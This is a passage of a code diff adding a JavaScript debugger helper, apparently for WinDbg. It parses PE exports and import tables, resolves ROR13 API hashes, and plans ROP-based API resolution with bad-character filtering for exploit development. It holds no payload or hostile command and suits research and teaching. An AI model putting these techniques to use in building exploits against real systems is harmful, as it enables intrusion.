+      // called per import entry by nearestSymbol during iat_find, so without a cache
+      // an all-modules scan re-reads kernel32/kernelbase exports tens of thousands of
+      // times — minutes to hours. Cache per module base (a rebase changes the key).
+      this.exportCache = /* @__PURE__ */ new Map();
+      this.parser = parser;
+    }
+    cachedExports(module) {
+      const key2 = module.base.toString();
+      let cached = this.exportCache.get(key2);
+      if (!cached) {
+        cached = this.parser.parseExports(module);
+        this.exportCache.set(key2, cached);
+      }
+      return cached;
+    }
+    enumerate(module, filter) {
+      const entries = this.cachedExports(module);
+      const needle = normalizeNeedle(filter);
+      return entries.filter((entry) => {
+        if (!needle) {
+          return true;
+        }
+        return entry.name.toLowerCase().includes(needle);
+      }).sort((a, b) => {
+        const left = a.name || `~${a.ordinal.toString(16)}`;
+        const right = b.name || `~${b.ordinal.toString(16)}`;
+        return left.localeCompare(right);
+      }).map((entry) => ({
+        Ordinal: entry.ordinal.toString(),
+        RVA: `0x${entry.rva.toString(16).toUpperCase().padStart(8, "0")}`,
+        VA: toDmlAddress(entry.va, "u"),
+        Name: entry.name || "<unnamed>"
+      }));
+    }
+    resolve(module, symbol) {
+      const needle = symbol.trim().toLowerCase();
+      if (!needle) {
+        return void 0;
+      }
+      return this.cachedExports(module).find((entry) => entry.name.toLowerCase() === needle);
+    }
+    getExports(module) {
+      return this.cachedExports(module);
+    }
+    getExportDirectory(module) {
+      return this.parser.parseExportDirectory(module);
+    }
+    findByOrdinalIndex(module, ordinalIndex) {
+      if (ordinalIndex < 0) {
+        return void 0;
+      }
+      const exportDir = this.parser.parseExportDirectory(module);
+      if (!exportDir) {
+        return void 0;
+      }
+      const targetOrdinal = exportDir.ordinalBase + ordinalIndex;
+      return this.cachedExports(module).find((entry) => entry.ordinal === targetOrdinal);
+    }
+    isForwarded(module, entry) {
+      const exportDir = this.parser.parseExportDirectory(module);
+      if (!exportDir) {
+        return { forwarded: false, target: "" };
+      }
+      const start = exportDir.exportDirectoryRva;
+      const end = start + exportDir.exportDirectorySize;
+      if (entry.rva >= start && entry.rva < end) {
+        return {
+          forwarded: true,
+          target: readAsciiString2(module.base + __bi(entry.rva), 512)
+        };
+      }
+      return { forwarded: false, target: "" };
+    }
+    nearestSymbol(module, address) {
+      const exportsList = this.cachedExports(module).filter((entry) => entry.name.length > 0).sort((a, b) => a.va < b.va ? -1 : 1);
+      let nearest;
+      for (const entry of exportsList) {
+        if (entry.va > address) {
+          break;
+        }
+        nearest = entry;
+      }
+      if (!nearest) {
+        return void 0;
+      }
+      return { name: nearest.name, offset: address - nearest.va };
+    }
+  };
+  var IATResolver = class {
+    constructor(pointerSize, parser, exportResolver, modulesProvider) {
+      this.pointerSize = pointerSize;
+      this.parser = parser;
+      this.exportResolver = exportResolver;
+      this.modulesProvider = modulesProvider;
+    }
+    enumerateIat(owner) {
+      const headers = this.parser.parseHeaders(owner);
+      const importDirRva = this.readImportDirectoryRva(owner, headers.optionalHeaderMagic, headers.ntHeader);
+      if (importDirRva === 0) {
+        return [];
+      }
+      const modules = this.modulesProvider();
+      const rows = [];
+      const descriptors = this.readImportDescriptors(owner, importDirRva);
+      const firstThunkBounds = descriptors.map((descriptor) => descriptor.firstThunk).filter((rva) => rva > 0).sort((left, right) => left - right);
+      for (const descriptor of descriptors) {
+        const { originalFirstThunk, nameRva, firstThunk } = descriptor;
+        const nextFirstThunk = firstThunkBounds.find((rva) => rva > firstThunk);
+        const iatEnd = nextFirstThunk ? owner.base + __bi(nextFirstThunk) : void 0;
+        if (firstThunk === 0) {
+          continue;
+        }
+        const dllName = nameRva === 0 ? "<unknown>" : readAsciiString2(owner.base + __bi(nameRva), 260);
+        const expectedModule = this.findByDllName(modules, dllName);
+        const intBaseRva = originalFirstThunk !== 0 ? originalFirstThunk : firstThunk;
+        let intPtr = owner.base + __bi(intBaseRva);
+        let iatPtr = owner.base + __bi(firstThunk);
+        const maxThunks = 16384;
+        for (let thunkIndex = 0; thunkIndex < maxThunks; thunkIndex += 1) {
+          if (iatEnd !== void 0 && iatPtr >= iatEnd) {
+            break;
+          }
+          const intValue = this.readThunk(intPtr);
+          const iatValue = this.readThunk(iatPtr);
+          if (intValue === __bi(0) && iatValue === __bi(0)) {
+            break;
+          }
+          const target = iatValue;
+          const actualModule = this.findContainingModule(modules, target);
+          const nearest = actualModule ? this.exportResolver.nearestSymbol(actualModule, target) : void 0;
+          const imported = this.parseImportedName(owner, intValue);
+          rows.push({
+            ownerModule: owner.name,
+            importDll: dllName,
+            symbol: this.displayImportedSymbol(imported, nearest, expectedModule, actualModule),
+            ordinal: imported.ordinal,
+            nameWarning: imported.warning,
+            slot: iatPtr,
+            target,
+            expectedModule,
+            actualModule,
+            nearest,
+            status: this.classifyStatus(target, expectedModule, actualModule)
+          });
+          intPtr += __bi(this.pointerSize);
+          iatPtr += __bi(this.pointerSize);
+        }
+      }
+      return rows;
+    }
+    readImportDescriptors(owner, importDirRva) {
+      const descriptors = [];
+      let descriptorAddress = owner.base + __bi(importDirRva);
+      const maxDescriptors = 4096;
+      for (let index = 0; index < maxDescriptors; index += 1) {
+        const originalFirstThunk = readUint32LE(descriptorAddress);
+        const _timeDateStamp = readUint32LE(descriptorAddress + __bi(4));
+        const _forwarderChain = readUint32LE(descriptorAddress + __bi(8));
+        const nameRva = readUint32LE(descriptorAddress + __bi(12));
+        const firstThunk = readUint32LE(descriptorAddress + __bi(16));
+        if (originalFirstThunk === 0 && nameRva === 0 && firstThunk === 0) {
+          break;
+        }
+        descriptors.push({ originalFirstThunk, nameRva, firstThunk, descriptorAddress });
+        descriptorAddress += __bi(20);
+      }
+      return descriptors;
+    }
+    classifyStatus(target, expected, actual) {
+      if (target === __bi(0)) {
+        return "unresolved";
+      }
+      if (!this.isMapped(target)) {
+        return "unmapped";
+      }
+      if (!actual) {
+        return "unknown-module";
+      }
+      if (!this.isExecutable(actual, target)) {
+        return "non-exec";
+      }
+      if (expected && expected.name.toLowerCase() !== actual.name.toLowerCase()) {
+        return "outside-module";
+      }
+      return "ok";
+    }
+    isMapped(address) {
+      if (address === __bi(0)) {
+        return false;
+      }
+      try {
+        readMemory(address, 1);
+        return true;
+      } catch (_error) {
+        return false;
+      }
+    }
+    isExecutable(module, address) {
+      try {
+        const headers = this.parser.parseHeaders(module);
+        const numberOfSections = readUint16LE(headers.ntHeader + __bi(6));
+        const sizeOfOptionalHeader = readUint16LE(headers.ntHeader + __bi(20));
+        let sectionHeader = headers.ntHeader + __bi(24 + sizeOfOptionalHeader);
+        const rva = address - module.base;
+        const IMAGE_SCN_MEM_EXECUTE2 = 536870912;
+        for (let i = 0; i < numberOfSections; i += 1) {
+          const virtualSize = readUint32LE(sectionHeader + __bi(8));
+          const virtualAddress = readUint32LE(sectionHeader + __bi(12));
+          const characteristics = readUint32LE(sectionHeader + __bi(36));
+          const start = __bi(virtualAddress);
+          const end = start + __bi(Math.max(virtualSize, 1));
+          if (rva >= start && rva < end) {
+            return (characteristics & IMAGE_SCN_MEM_EXECUTE2) !== 0;
+          }
+          sectionHeader += __bi(40);
+        }
+      } catch (_error) {
+        return false;
+      }
+      return false;
+    }
+    readImportDirectoryRva(owner, optionalMagic, ntHeader) {
+      const optionalHeader = ntHeader + __bi(24);
+      const dataDirectoryOffset = optionalHeader + __bi(optionalMagic === 523 ? 112 : 96);
+      try {
+        return readUint32LE(dataDirectoryOffset + __bi(8));
+      } catch (_error) {
+        return 0;
+      }
+    }
+    findContainingModule(modules, address) {
+      return modules.find((module) => address >= module.base && address < module.end);
+    }
+    findByDllName(modules, name) {
+      const needle = name.trim().toLowerCase();
+      if (!needle) {
+        return void 0;
+      }
+      const noExt = needle.endsWith(".dll") ? needle.slice(0, -4) : needle;
+      return modules.find((module) => {
+        const lower = module.name.toLowerCase();
+        const lowerNoExt = lower.endsWith(".dll") ? lower.slice(0, -4) : lower;
+        return lower === needle || lowerNoExt === noExt;
+      });
+    }
+    displayImportedSymbol(imported, nearest, expected, actual) {
+      if (!imported.name.startsWith("<")) {
+        return imported.name;
+      }
+      if (expected && actual && expected.name.toLowerCase() !== actual.name.toLowerCase()) {
+        return imported.name;
+      }
+      if (nearest && nearest.offset === __bi(0)) {
+        return nearest.name;
+      }
+      if (nearest) {
+        return `${nearest.name}+0x${nearest.offset.toString(16).toUpperCase()}`;
+      }
+      return imported.name;
+    }
+    parseImportedName(owner, intValue) {
+      if (intValue === __bi(0)) {
+        return { name: "<null>" };
+      }
+      const ordinalFlag = this.pointerSize === 8 ? __bi("0x8000000000000000") : __bi("0x80000000");
+      if (__bi.and(intValue, ordinalFlag) !== __bi(0)) {
+        return { name: "<ordinal>", ordinal: Number(__bi.and(intValue, __bi(65535))) };
+      }
+      if (intValue < __bi(256) || intValue >= owner.size) {
+        return {
+          name: "<invalid-name-rva>",
+          warning: `Thunk value 0x${intValue.toString(16).toUpperCase()} is not an import-name RVA.`
+        };
+      }
+      const byName = owner.base + intValue + __bi(2);
+      try {
+        return { name: readAsciiString2(byName, 512) };
+      } catch (error2) {
+        return {
+          name: "<unreadable-name>",
+          warning: formatError(error2)
+        };
+      }
+    }
+    readThunk(address) {
+      return this.pointerSize === 8 ? readPointer(address, 8) : __bi(readUint32LE(address));
+    }
+  };
+  var ShellcodeHelper = class {
+    constructor() {
+      this.pointerSize = getPointerSize();
+      this.parser = new PEParser(this.pointerSize);
+      this.exportResolver = new ExportResolver(this.parser);
+      this.hashResolver = new HashResolver();
+      this.iatResolver = new IATResolver(this.pointerSize, this.parser, this.exportResolver, () => this.readModules());
+    }
+    peb() {
+      const pebAddress = this.getPebAddress();
+      if (!pebAddress) {
+        return this.errorRows("Unable to resolve PEB in current context.");
+      }
+      try {
+        const ldrOffset = this.pointerSize === 8 ? 24 : 12;
+        const processParametersOffset = this.pointerSize === 8 ? 32 : 16;
+        const imageBaseOffset = this.pointerSize === 8 ? 16 : 8;
+        const ldr = readPointer(pebAddress + __bi(ldrOffset), this.pointerSize);
+        const processParameters = readPointer(pebAddress + __bi(processParametersOffset), this.pointerSize);
+        const imageBase = readPointer(pebAddress + __bi(imageBaseOffset), this.pointerSize);
+        const beingDebugged = readMemory(pebAddress + __bi(2), 1)[0] !== 0;
+        return [
+          { Field: "PEB", Value: toDmlAddress(pebAddress, "db") },
+          { Field: "Ldr", Value: toDmlAddress(ldr, "db") },
+          { Field: "ProcessParameters", Value: toDmlAddress(processParameters, "db") },
+          { Field: "BeingDebugged", Value: beingDebugged ? "true" : "false" },
+          { Field: "ImageBase", Value: toDmlAddress(imageBase, "db") }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    modules() {
+      return this.readModules().map((module) => ({
+        Base: toDmlAddress(module.base, "db"),
+        End: toDmlAddress(module.end, "db"),
+        Size: `0x${module.size.toString(16).toUpperCase()}`,
+        Name: module.name,
+        Path: module.path
+      }));
+    }
+    modulePages(moduleName) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const pageSize = __bi(4096);
+      const pages = lookup.module.size === __bi(0) ? __bi(0) : __bi.div(lookup.module.size + pageSize - __bi(1), pageSize);
+      return [
+        {
+          Module: lookup.module.name,
+          Base: toDmlAddress(lookup.module.base, "db"),
+          End: toDmlAddress(lookup.module.end, "db"),
+          Size: `0x${lookup.module.size.toString(16).toUpperCase()}`,
+          PageSize: `0x${pageSize.toString(16).toUpperCase()}`,
+          Pages: pages.toString()
+        }
+      ];
+    }
+    pageSummary(moduleName) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const summary = this.collectPageProtections(lookup.module);
+      const pageSize = __bi(4096);
+      const totalPages = Array.from(summary.values()).reduce((sum, count) => sum + count, 0);
+      const executablePages = Array.from(summary.entries()).reduce((sum, [protect, count]) => {
+        return sum + (this.isExecutableProtect(protect) ? count : 0);
+      }, 0);
+      const rows = [
+        {
+          Module: lookup.module.name,
+          Base: toDmlAddress(lookup.module.base, "db"),
+          End: toDmlAddress(lookup.module.end, "db"),
+          Size: `0x${lookup.module.size.toString(16).toUpperCase()}`,
+          PageSize: `0x${pageSize.toString(16).toUpperCase()}`,
+          TotalPages: totalPages.toString(),
+          ExecutablePages: executablePages.toString()
+        },
+        {
+          Protect: "TOTAL",
+          Name: "TOTAL",
+          Pages: totalPages.toString(),
+          ExecutablePages: executablePages.toString()
+        },
+        ...[...summary.entries()].sort((left, right) => left[0] - right[0]).map(([protect, count]) => {
+          const decoded = decodeProtectValue(protect);
+          return {
+            Protect: `0x${protect.toString(16).toUpperCase().padStart(2, "0")}`,
+            Name: decoded.name,
+            Pages: count.toString(),
+            Executable: decoded.executable ? "yes" : "no",
+            Writable: decoded.writable ? "yes" : "no"
+          };
+        })
+      ];
+      return rows;
+    }
+    base(name) {
+      const lookup = this.findModule(name);
+      if (lookup.kind === "ok") {
+        return [{ Module: lookup.module.name, Base: toDmlAddress(lookup.module.base, "db") }];
+      }
+      if (lookup.kind === "ambiguous") {
+        return this.moduleCandidatesRows(lookup.candidates);
+      }
+      return this.errorRows(`No module matches "${name}".`);
+    }
+    pe(name) {
+      const lookup = this.findModule(name);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        return this.parser.formatHeaderRows(lookup.module);
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    exports(name, filter) {
+      const lookup = this.findModule(name);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const rows = this.exportResolver.enumerate(lookup.module, filter);
+        if (rows.length === 0) {
+          return this.errorRows("No exports matched the requested filter.");
+        }
+        return rows;
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    resolve(moduleName, symbol) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const entry = this.exportResolver.resolve(lookup.module, symbol);
+      if (!entry) {
+        return this.errorRows(`Symbol "${symbol}" was not found in ${lookup.module.name}.`);
+      }
+      return [
+        {
+          Module: lookup.module.name,
+          Symbol: `${entry.name} (${lookup.module.name}!${entry.name})`,
+          Address: toDmlAddress(entry.va, "u")
+        }
+      ];
+    }
+    hashes(moduleName, algorithm) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const exportsList = this.exportResolver.getExports(lookup.module);
+        const rows = this.hashResolver.compute(exportsList, algorithm);
+        if (rows.length === 0) {
+          return this.errorRows("No named exports were found to hash.");
+        }
+        return rows;
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    hashresolve(moduleName, hashValue, algorithm = "ROR13") {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const parsed = parseHashValue(hashValue);
+      if (parsed === void 0) {
+        return this.errorRows(`Invalid hash value "${String(hashValue)}".`);
+      }
+      try {
+        for (const entry of this.exportResolver.getExports(lookup.module)) {
+          if (!entry.name) {
+            continue;
+          }
+          const hashHex = this.hashResolver.hashValue(entry.name, algorithm).Hash;
+          const computed = parseInt(hashHex.replace(/^0x/i, ""), 16) >>> 0;
+          if (computed === parsed) {
+            const forward = this.exportResolver.isForwarded(lookup.module, entry);
+            return [
+              {
+                Module: lookup.module.name,
+                Algorithm: String(this.hashResolver.hashValue(entry.name, algorithm).Algorithm),
+                Hash: `0x${parsed.toString(16).toUpperCase().padStart(8, "0")}`,
+                Symbol: entry.name,
+                Address: toDmlAddress(entry.va, "u"),
+                Forwarded: forward.forwarded ? "true" : "false",
+                ForwardTo: forward.target || ""
+              }
+            ];
+          }
+        }
+        return this.errorRows(`No symbol matched hash 0x${parsed.toString(16).toUpperCase().padStart(8, "0")}.`);
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    exportdir(moduleName) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const info2 = this.exportResolver.getExportDirectory(lookup.module);
+        if (!info2) {
+          return this.errorRows(`Module ${lookup.module.name} has no export directory.`);
+        }
+        return [
+          { Field: "Module", Value: lookup.module.name },
+          { Field: "Base", Value: toDmlAddress(lookup.module.base, "db") },
+          { Field: "Export RVA", Value: `0x${info2.exportDirectoryRva.toString(16).toUpperCase()}` },
+          { Field: "Export VA", Value: toDmlAddress(info2.exportDirectoryVa, "db") },
+          { Field: "AddressOfNames", Value: `0x${info2.addressOfNamesRva.toString(16).toUpperCase()}` },
+          { Field: "NumberOfFunctions", Value: info2.numberOfFunctions.toString() },
+          { Field: "NumberOfNames", Value: info2.numberOfNames.toString() },
+          { Field: "AddressOfFunctions", Value: `0x${info2.addressOfFunctionsRva.toString(16).toUpperCase()}` },
+          { Field: "AddressOfNameOrdinals", Value: `0x${info2.addressOfNameOrdinalsRva.toString(16).toUpperCase()}` }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    export(moduleName, symbol) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const requested = symbol == null ? void 0 : symbol.trim();
+      if (!requested) {
+        return this.errorRows(`Symbol is required. Use sc.exports("${lookup.module.name}") to list exported functions.`);
+      }
+      try {
+        const entry = this.exportResolver.resolve(lookup.module, requested);
+        if (!entry) {
+          return this.errorRows(`Symbol "${requested}" was not found in ${lookup.module.name}.`);
+        }
+        const exportDir = this.exportResolver.getExportDirectory(lookup.module);
+        if (!exportDir) {
+          return this.errorRows(`Module ${lookup.module.name} has no export directory.`);
+        }
+        const namesVa = lookup.module.base + __bi(exportDir.addressOfNamesRva);
+        const ordinalsVa = lookup.module.base + __bi(exportDir.addressOfNameOrdinalsRva);
+        let nameRva = 0;
+        let ordinalIndex = entry.ordinal - exportDir.ordinalBase;
+        for (let i = 0; i < exportDir.numberOfNames; i += 1) {
+          const candidateNameRva = readUint32LE(namesVa + __bi(i * 4));
+          const candidateOrdinal = readUint16LE(ordinalsVa + __bi(i * 2));
+          const candidate = readAsciiString2(lookup.module.base + __bi(candidateNameRva), 512);
+          if (candidate.toLowerCase() === entry.name.toLowerCase()) {
+            nameRva = candidateNameRva;
+            ordinalIndex = candidateOrdinal;
+            break;
+          }
+        }
+        const forward = this.exportResolver.isForwarded(lookup.module, entry);
+        return [
+          { Property: "Name", Value: entry.name || "<unnamed>" },
+          { Property: "Name RVA", Value: `0x${nameRva.toString(16).toUpperCase()}` },
+          { Property: "Name VA", Value: toDmlAddress(lookup.module.base + __bi(nameRva), "db") },
+          { Property: "Ordinal Index", Value: ordinalIndex.toString() },
+          { Property: "Ordinal", Value: entry.ordinal.toString() },
+          { Property: "Function RVA", Value: `0x${entry.rva.toString(16).toUpperCase()}` },
+          { Property: "Function VA", Value: toDmlAddress(entry.va, "u") },
+          { Property: "Forwarded", Value: forward.forwarded ? "true" : "false" },
+          { Property: "ForwardTo", Value: forward.target || "" }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    exportat(moduleName, ordinalIndex) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const entry = this.exportResolver.findByOrdinalIndex(lookup.module, ordinalIndex);
+        if (!entry) {
+          return this.errorRows(`Ordinal index ${ordinalIndex} not found in ${lookup.module.name}.`);
+        }
+        const forward = this.exportResolver.isForwarded(lookup.module, entry);
+        return [
+          {
+            Module: lookup.module.name,
+            OrdinalIndex: ordinalIndex.toString(),
+            Ordinal: entry.ordinal.toString(),
+            Name: entry.name || "<unnamed>",
+            RVA: `0x${entry.rva.toString(16).toUpperCase()}`,
+            VA: toDmlAddress(entry.va, "u"),
+            Forwarded: forward.forwarded ? "true" : "false",
+            ForwardTo: forward.target || ""
+          }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    exportwalk(moduleName, symbol = "GetProcAddress", verbose = false) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const headers = this.parser.parseHeaders(lookup.module);
+        const exportDir = this.exportResolver.getExportDirectory(lookup.module);
+        if (!exportDir) {
+          return this.errorRows(`Module ${lookup.module.name} has no export directory.`);
+        }
+        const namesVa = lookup.module.base + __bi(exportDir.addressOfNamesRva);
+        const ordinalsVa = lookup.module.base + __bi(exportDir.addressOfNameOrdinalsRva);
+        const functionsVa = lookup.module.base + __bi(exportDir.addressOfFunctionsRva);
+        const rows = [];
+        let matchIndex = -1;
+        let matchName = "";
+        let ordinalIndex = -1;
+        let functionRva = 0;
+        for (let i = 0; i < exportDir.numberOfNames; i += 1) {
+          const nameRva = readUint32LE(namesVa + __bi(i * 4));
+          const name = readAsciiString2(lookup.module.base + __bi(nameRva), 512);
+          if (verbose) {
+            rows.push({ Step: "Walk", Value: `${i}: ${name}` });
+          }
+          if (name.toLowerCase() === symbol.trim().toLowerCase()) {
+            matchIndex = i;
+            matchName = name;
+            ordinalIndex = readUint16LE(ordinalsVa + __bi(i * 2));
+            functionRva = readUint32LE(functionsVa + __bi(ordinalIndex * 4));
+            break;
+          }
+        }
+        const summary = [
+          { Step: "Resolving", Value: symbol },
+          { Step: "[1] Module base", Value: toDmlAddress(lookup.module.base, "db") },
+          { Step: "[2] DOS header", Value: toDmlAddress(headers.dosHeader, "db") },
+          { Step: "[3] DOS.e_lfanew", Value: `0x${headers.eLfanew.toString(16).toUpperCase()}` },
+          { Step: "[4] NT header", Value: toDmlAddress(headers.ntHeader, "db") },
+          { Step: "[5] Export directory", Value: toDmlAddress(exportDir.exportDirectoryVa, "db") },
+          { Step: "[6] AddressOfNames", Value: toDmlAddress(namesVa, "db") },
+          { Step: "[7] AddressOfNameOrdinals", Value: toDmlAddress(ordinalsVa, "db") },
+          { Step: "[8] AddressOfFunctions", Value: toDmlAddress(functionsVa, "db") }
+        ];
+        if (matchIndex < 0) {
+          summary.push({ Step: "[9] Match", Value: "not found" });
+          return summary.concat(verbose ? rows : []);
+        }
+        const finalVa = lookup.module.base + __bi(functionRva);
+        const matchedEntry = this.exportResolver.resolve(lookup.module, matchName);
+        const forward = matchedEntry ? this.exportResolver.isForwarded(lookup.module, matchedEntry) : { forwarded: false, target: "" };
+        summary.push({ Step: "[9] Match index", Value: `${matchIndex}: ${matchName}` }, { Step: "[10] Ordinal index", Value: ordinalIndex.toString() }, { Step: "[11] Function RVA", Value: `0x${functionRva.toString(16).toUpperCase()}` }, { Step: "[12] Final VA", Value: toDmlAddress(finalVa, "u") }, { Step: "[13] Forwarded", Value: forward.forwarded ? `true (${forward.target})` : "false" });
+        return summary.concat(verbose ? rows : []);
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    hash(name, algorithm = "ROR13") {
+      const input = name.trim();
+      if (!input) {
+        return this.errorRows("Input string is required.");
+      }
+      try {
+        return [this.hashResolver.hashValue(input, algorithm)];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    algorithms() {
+      return this.hashResolver.listAlgorithms();
+    }
+    iat(moduleName, filter) {
+      const lookup = moduleName ? this.findModule(moduleName) : this.findMainModule();
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const needle = filter == null ? void 0 : filter.trim().toLowerCase();
+        const rows = this.iatResolver.enumerateIat(lookup.module).filter((entry) => {
+          if (!needle)
+            return true;
+          return entry.symbol.toLowerCase().includes(needle) || entry.importDll.toLowerCase().includes(needle);
+        }).map((entry) => {
+          var _a;
+          return {
+            Owner: toDmlModule(entry.ownerModule),
+            DLL: toDmlModule(entry.importDll),
+            Symbol: toDmlSymbol(entry.importDll, entry.symbol),
+            Ordinal: entry.ordinal ? entry.ordinal.toString() : "",
+            Slot: toDmlAddress(entry.slot, "dps"),
+            Target: toDmlAddress(entry.target, "u"),
+            Module: entry.actualModule ? toDmlModule(entry.actualModule.name) : "unknown",
+            "Symbol+Offset": entry.nearest ? toDmlText(`${entry.nearest.name}+0x${entry.nearest.offset.toString(16).toUpperCase()}`, `u ${formatAddress(entry.target, this.pointerSize)}`) : "",
+            Status: entry.status,
+            Note: (_a = entry.nameWarning) != null ? _a : ""
+          };
+        });
+        if (rows.length === 0) {
+          return this.errorRows(filter ? `No IAT entries in ${lookup.module.name} matched "${filter}".` : `No IAT entries found for ${lookup.module.name}.`);
+        }
+        return rows;
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    iat_find(symbol) {
+      var _a;
+      const needle = symbol.trim().toLowerCase();
+      if (!needle) {
+        return this.errorRows("Symbol substring is required.");
+      }
+      const rows = [];
+      for (const module of this.readModules()) {
+        try {
+          const entries = this.iatResolver.enumerateIat(module);
+          for (const entry of entries) {
+            if (entry.symbol.toLowerCase().includes(needle)) {
+              rows.push({
+                Owner: toDmlModule(entry.ownerModule),
+                DLL: toDmlModule(entry.importDll),
+                Symbol: toDmlSymbol(entry.importDll, entry.symbol),
+                Slot: toDmlAddress(entry.slot, "dps"),
+                Target: toDmlAddress(entry.target, "u"),
+                Module: entry.actualModule ? toDmlModule(entry.actualModule.name) : "unknown",
+                Status: entry.status,
+                Note: (_a = entry.nameWarning) != null ? _a : ""
+              });
+            }
+          }
+        } catch (_error) {
+        }
+      }
+      if (rows.length === 0) {
+        return this.errorRows(`No IAT entries matched "${symbol}".`);
+      }
+      return rows;
+    }
+    iat_ptr(moduleName, symbol) {
+      var _a;
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const needle = symbol.trim().toLowerCase();
+      if (!needle) {
+        return this.errorRows("Symbol is required.");
+      }
+      try {
+        const match = this.iatResolver.enumerateIat(lookup.module).find((entry) => entry.symbol.toLowerCase() === needle || entry.symbol.toLowerCase().includes(needle));
+        if (!match) {
+          return this.errorRows(`No IAT slot found for "${symbol}" in ${lookup.module.name}.`);
+        }
+        return [
+          {
+            slot: toDmlAddress(match.slot, "dps"),
+            target: toDmlAddress(match.target, "u"),
+            module: match.actualModule ? toDmlModule(match.actualModule.name) : "unknown",
+            symbol: toDmlSymbol(match.importDll, match.symbol),
+            status: match.status,
+            note: (_a = match.nameWarning) != null ? _a : ""
+          }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    /** Capture a read-only, stopped-debugger snapshot for rop.api_plan. */
+    apiPlan(targetSpec, badchars = []) {
+      const parsed = parseApiSpec(targetSpec);
+      if (!parsed)
+        return { candidates: [], error: 'Target must be "Symbol" or "MODULE!Symbol".' };
+      try {
+        const modules = this.readModules();
+        const targetModules = parsed.module ? modules.filter((module) => moduleNameMatches(module.name, parsed.module)) : modules.filter((module) => this.exportResolver.resolve(module, parsed.symbol) !== void 0);
+        if (targetModules.length === 0)
+          return { candidates: [], error: `No loaded export matches ${targetSpec}.` };
+        if (targetModules.length > 1) {
+          return { candidates: [], error: `Target ${parsed.symbol} is exported by multiple modules; specify MODULE!${parsed.symbol}.` };
+        }
+        const targetModule = targetModules[0];
+        const targetExport = this.exportResolver.resolve(targetModule, parsed.symbol);
+        if (!targetExport)
+          return { candidates: [], error: `No export ${parsed.symbol} in ${targetModule.name}.` };
+        const forward = this.exportResolver.isForwarded(targetModule, targetExport);
+        if (forward.forwarded) {
+          return { candidates: [], error: `${targetModule.name}!${parsed.symbol} is forwarded to ${forward.target}; forwarded target resolution is not yet implemented.` };
+        }
+        const headers = this.parser.parseHeaders(targetModule);
+        const imports = modules.flatMap((owner) => {
+          try {
+            const ownerHeaders = this.parser.parseHeaders(owner);
+            return this.iatResolver.enumerateIat(owner).map((entry) => {
+              var _a, _b, _c, _d;
+              return {
+                ownerModule: owner.name,
+                ownerBase: owner.base,
+                ownerImageBase: ownerHeaders.imageBase,
+                slot: entry.slot,
+                pointer: entry.target,
+                actualModule: (_a = entry.actualModule) == null ? void 0 : _a.name,
+                actualModuleBase: (_b = entry.actualModule) == null ? void 0 : _b.base,
+                importedSymbol: entry.symbol,
+                nearestSymbol: (_c = entry.nearest) == null ? void 0 : _c.name,
+                nearestOffset: (_d = entry.nearest) == null ? void 0 : _d.offset
+              };
+            });
+          } catch (_error) {
+            return [];
+          }
+        });
+        const target = { module: targetModule.name, symbol: targetExport.name, address: targetExport.va, exportRva: targetExport.rva };
+        return {
+          target,
+          candidates: planApiResolution(target, imports, badchars),
+          targetIdentity: {
+            name: targetModule.name,
+            path: targetModule.path,
+            base: targetModule.base,
+            imageBase: headers.imageBase,
+            sizeOfImage: headers.sizeOfImage,
+            timeDateStamp: headers.timeDateStamp,
+            hash: "not-collected"
+          }
+        };
+      } catch (error2) {
+        return { candidates: [], error: formatError(error2) };
+      }
+    }
+    findModule(name) {
+      const needle = normalizeNeedle(name);
+      if (!needle) {
+        return { kind: "not_found", name };
+      }
+      const modules = this.readModules();
+      const scored = modules.map((module) => {
+        const basename = module.name.toLowerCase();
+        const basenameNoExt = basename.endsWith(".dll") ? basename.slice(0, -4) : basename;
+        const fullPath = module.path.toLowerCase();
+        if (basename === needle || basenameNoExt === needle) {
+          return { module, score: 0 };
+        }
+        if (basename.startsWith(needle) || basenameNoExt.startsWith(needle)) {
+          return { module, score: 1 };
+        }
+        if (basename.includes(needle) || basenameNoExt.includes(needle)) {
+          return { module, score: 2 };
+        }
+        if (fullPath.includes(needle)) {
+          return { module, score: 3 };
+        }
+        return void 0;
+      }).filter((entry) => entry !== void 0);
+      if (scored.length === 0) {
